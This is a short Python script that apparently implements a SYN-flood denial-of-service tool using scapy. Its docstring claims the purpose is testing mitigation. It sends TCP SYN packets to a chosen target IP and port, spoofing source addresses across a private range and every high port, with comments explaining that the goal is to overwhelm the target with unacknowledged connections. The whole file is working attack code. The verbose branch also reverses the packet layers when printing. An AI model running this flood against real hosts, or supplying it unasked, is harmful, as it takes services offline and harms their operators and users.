#!/usr/bin/env python 

"""Simple Syn Flooder to test mitigation techniques

Usage: 
	naiveSynFlood.py <targetIP> <targetPort> [-v | --verbose]

Options:
	-h, --help	Show this screen
	--version	Show version.
	-v, --verbose	Verbose logs
	
"""
from docopt import docopt
import logging
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def main(args):
	targetIP = args["<targetIP>"]
	targetPort = int(args["<targetPort>"])
	if args["--verbose"] == 1:
		verbose = True
	else:
		verbose = False
	print("\n-------\n")
	print("Starting flood\n")

	#Hardcoded src IP for internal testing.
	src = "172.31.255."
	for i in range(1,254):
		srcIP = src + str(i)	
		for srcPort in range(1024, 65536):
			if verbose:
				print(" > Sending from %s port %s\n " %(srcIP, srcPort))

			#Building packet.

			#Specifying IP header information
			#Layer 3 protocol
			ip = IP(src=srcIP, dst=targetIP)
			
			#Adding TCP information.
			#Layer 4 protocol
			#Flag S for Syn.
			tcp = TCP(sport=srcPort, dport=targetPort, flags="S")

			
			#Sending packet
			if verbose:
				print("--------Packet information--------\n")
				(tcp/ip).show()
				print("----------------------------------\n")


			send(ip/tcp,verbose=False)
			#Can override level of verbosity.
			
			#Why are we not using loop = 1 to send the packet endlessly?
			#Thats because we need to send them from different src ports and host to 
			#effectively overload the target host with an avalanche of UN-ACKed requests.
			#time.sleep(1)
	print("\n<> Attack finished <>\n")


if __name__ == '__main__':
	args = docopt(__doc__, version="Naive Syn Flooder 0.1")
	main(args)
